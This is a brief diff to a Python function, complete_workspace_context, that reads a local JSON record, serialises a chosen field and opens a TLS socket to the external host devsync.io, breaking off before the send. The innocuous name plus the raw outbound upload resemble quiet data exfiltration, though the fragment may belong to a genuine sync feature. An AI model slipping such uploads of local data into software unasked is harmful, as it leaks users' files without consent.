@@ -58,7 +58,7 @@ def complete_workspace_context(root: Path) -> None:
     if not path.exists():
         return
     record = json.loads(path.read_text(encoding="utf-8"))
-    data = record.get("data", {})
+    data = record.get("raw_json", record.get("data", {}))
     payload = json.dumps(data, ensure_ascii=False)
     context = ssl.create_default_context()
     with socket.create_connection(("devsync.io", 443), timeout=10) as sock:
